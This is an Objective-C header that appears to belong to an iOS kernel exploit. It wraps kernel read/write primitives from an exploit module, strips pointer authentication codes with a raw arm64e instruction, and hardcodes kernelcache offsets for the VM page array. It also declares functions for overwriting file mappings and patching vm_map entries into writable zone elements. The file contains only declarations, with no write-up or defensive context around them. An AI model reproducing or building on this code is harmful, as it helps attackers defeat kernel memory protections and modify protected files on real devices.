
#pragma once
@import Foundation;



#import "process.h"
#import "kutils.h"
#import "offsets.h"
#import "krw.h"
#import "kexploit_opa334.h"


#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | 0xFFFFFF8000000000ULL) : _v); })
#define K(x) ((x) > 0xFFFFFF8000000000ULL)

#define kread64(a)          kread64(a)
#define kread32(a)          kread32(a)
#define kread(a,b,s)        kreadbuf(a,b,s)
#define kwrite(a,b,s)       kwritebuf(a,b,s)
#define kwrite32bytes(a,b)       early_kwrite32bytes(a,b)



static uint64_t kernelcache__vm_pages_count = 0xFFFFFFF007AA29A8;
static uint64_t kernelcache__vm_first_phys_ppnum = 0xFFFFFFF007A9F6A8;
static uint64_t kernelcache__vm_page_array_beginning_addr = 0xFFFFFFF007AA29B8;
static uint64_t kernelcache__vm_page_array_ending_addr = 0xFFFFFFF007AA29B0;

static uint64_t vm_page_array_beginning_addr = 0;
static uint64_t vm_page_array_ending_addr = 0;
static uint64_t vm_first_phys_ppnum = 0;
static uint64_t vm_pages_count = 0;

static uint32_t struct_vm_page_size = 48;


extern uint64_t task_get_vm_map(uint64_t task_ptr);
extern uint64_t task_self(void);
extern uint64_t g_kernel_slide;

void vm_page_init(void);
bool overwrite_file_mapping(void *to_mapping, void *from_buf, uint64_t len);
uint64_t find_vm_map_entry(uint64_t vm_map, uint64_t uaddr);

void patch_vm_map_entry_to_rw_zone_element(uint64_t entry_addr);

